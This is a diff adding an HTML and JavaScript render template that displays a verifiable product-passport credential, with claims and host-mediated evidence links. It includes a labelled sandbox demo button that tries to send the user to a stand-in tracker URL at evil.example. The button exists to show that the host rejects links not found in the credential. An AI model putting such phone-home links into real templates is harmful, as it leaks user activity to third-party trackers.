@@ -1,0 +1,127 @@
+<div class="card">
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      try {
+        const el = document.querySelector('head > script[name="credential"]');
+        if (!el) throw new Error('credential data block not found');
+        const credential = JSON.parse(el.textContent || 'null');
+        const subject = credential.credentialSubject || {};
+
+        document.querySelector('#product-name').textContent = subject.name || '';
+        document.querySelector('#product-id').textContent = subject.id || '';
+        document.querySelector('#issuer-name').textContent =
+          credential.issuer?.name || credential.issuer || '';
+
+        const claims = Array.isArray(subject.claims) ? subject.claims : [];
+        const list = document.querySelector('#claims');
+        for (const claim of claims) {
+          const li = document.createElement('li');
+          const title = document.createElement('strong');
+          title.textContent = claim.topic || 'Claim';
+          li.appendChild(title);
+
+          if (claim.value) {
+            const v = document.createElement('span');
+            v.textContent = ' — ' + claim.value;
+            li.appendChild(v);
+          }
+
+          const evidence = claim.evidence;
+          if (evidence?.linkURL) {
+            const btn = document.createElement('button');
+            btn.type = 'button';
+            btn.className = 'link-btn';
+            btn.textContent = evidence.linkName || 'View conformity credential';
+            btn.addEventListener('click', () => {
+              // Host-mediated traversal: no fetch / no top.location in the iframe.
+              window.renderMethodFollow({
+                href: evidence.linkURL,
+                linkType: evidence.linkType || 'conformityEvidence',
+                label: evidence.linkName || 'Conformity credential'
+              });
+            });
+            li.appendChild(document.createElement('br'));
+            li.appendChild(btn);
+          }
+
+          list.appendChild(li);
+        }
+
+        // Demo: template tries to phone home with a URL NOT in the credential.
+        // Host must reject this — illustrates the privacy boundary.
+        document.querySelector('#evil-btn').addEventListener('click', () => {
+          window.renderMethodFollow({
+            href: 'https://evil.example/track?vc=passport',
+            linkType: 'tracker',
+            label: 'Malicious tracker (should be rejected)'
+          });
+        });
+
+        window.renderMethodReady();
+      } catch (err) {
+        window.renderMethodReady(err instanceof Error ? err : new Error(String(err)));
+      }
+    });
+  </script>
+  <style>
+    :root {
+      color-scheme: light;
+      font-family: "DM Sans", system-ui, sans-serif;
+      --ink: #142033;
+      --muted: #5a6578;
+      --line: #d5dde8;
+      --accent: #0b6e4f;
+      --accent-soft: #d8f3e7;
+      --warn: #9b2c2c;
+    }
+    .card { padding: 0.25rem 0.15rem 0.5rem; color: var(--ink); }
+    .eyebrow {
+      font-size: 0.7rem; font-weight: 700; letter-spacing: 0.06em;
+      text-transform: uppercase; color: var(--muted); margin: 0 0 0.35rem;
+    }
+    h1 { margin: 0 0 0.25rem; font-size: 1.35rem; }
+    .meta { margin: 0 0 1rem; color: var(--muted); font-size: 0.9rem; }
+    .meta code { font-family: "IBM Plex Mono", ui-monospace, monospace; font-size: 0.84em; }
+    h2 { margin: 0 0 0.5rem; font-size: 0.78rem; text-transform: uppercase; letter-spacing: 0.05em; color: var(--muted); }
+    ul { margin: 0; padding: 0; list-style: none; display: grid; gap: 0.75rem; }
+    li {
+      border: 1px solid var(--line); border-radius: 10px; padding: 0.75rem 0.9rem;
+      background: #fff;
+    }
+    .link-btn {
+      margin-top: 0.55rem; font: inherit; font-weight: 600; font-size: 0.9rem;
+      color: #fff; background: var(--accent); border: 0; border-radius: 8px;
+      padding: 0.45rem 0.75rem; cursor: pointer;
+    }
+    .link-btn:hover { filter: brightness(1.05); }
+    .demo-evil {
+      margin-top: 1rem; padding-top: 0.85rem; border-top: 1px dashed var(--line);
+    }
+    .demo-evil p { margin: 0 0 0.45rem; font-size: 0.82rem; color: var(--muted); }
+    .evil-btn {
+      font: inherit; font-size: 0.82rem; color: var(--warn); background: #fff;
+      border: 1px solid #e8b4b4; border-radius: 8px; padding: 0.35rem 0.65rem;
+      cursor: pointer;
+    }
+  </style>
+
+  <p class="eyebrow">Digital Product Passport</p>
+  <h1 id="product-name"></h1>
+  <p class="meta">
+    <span id="product-id"></span><br />
+    Issued by <span id="issuer-name"></span>
+  </p>
+
+  <h2>Claims &amp; evidence</h2>
+  <ul id="claims"></ul>
+
+  <div class="demo-evil">
+    <p>
+      Sandbox demo: ask the host to open a URL that is <strong>not</strong> in the
+      credential (must be rejected — template cannot phone home).
+    </p>
+    <button type="button" class="evil-btn" id="evil-btn">
+      Try malicious followLink
+    </button>
+  </div>
+</div>
